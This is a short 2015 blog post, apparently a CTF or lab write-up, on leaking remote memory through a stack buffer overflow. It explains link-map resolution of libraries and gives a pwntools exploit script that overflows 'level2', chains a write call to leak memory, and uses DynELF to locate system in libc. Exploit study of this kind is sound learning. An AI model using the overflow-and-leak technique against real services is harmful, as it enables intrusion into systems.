---
layout: post
title: "remote_leak_mem"
date: 2015-09-25 21:24:21 +0800
comments: true
categories: 
---
###0x00 exe
exe:
store/leak_remote_mem/level2

###0x01 anaa
Resolving Library Addresses:

1.If we have a pointer into a dynamically-linked executable, we can leverage an internal linker structure called the link map. This is a linked list structure which contains information about each loaded library, including its full path and base address.

2.A pointer to the link map can be found in two ways. Both are referenced from entries in the DYNAMIC array.

3.In non-RELRO binaries, a pointer is placed in the .got.plt area in the binary. This is marked by finding the DT_PLTGOT_ area in the binary.
In all binaries, a pointer can be found in the area described by the DT_DEBUG area. This exists even in stripped binaries.

###0x02 exp

	from pwn import *
	 
	elf = ELF('./level2')
	plt_write = elf.symbols['write']
	plt_read = elf.symbols['read']
	vulfun_addr = 0x08048404
	 
	def leak(address):
	    f = open("input", 'w')
	    payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
	    f.write(payload1)
	    p.send(payload1)
	    data = p.recv(4)
	    print "%#x => %s" % (address, (data or '').encode('hex'))
	    f.close()
	    return data
	 
	 
	 
	#p = process('./level2')
	p = remote('192.168.56.103', 6666)

	 
	d = DynELF(leak, elf=ELF('./level2'))

	system_addr = d.lookup('system', 'libc')
	print "system_addr=" + hex(system_addr)
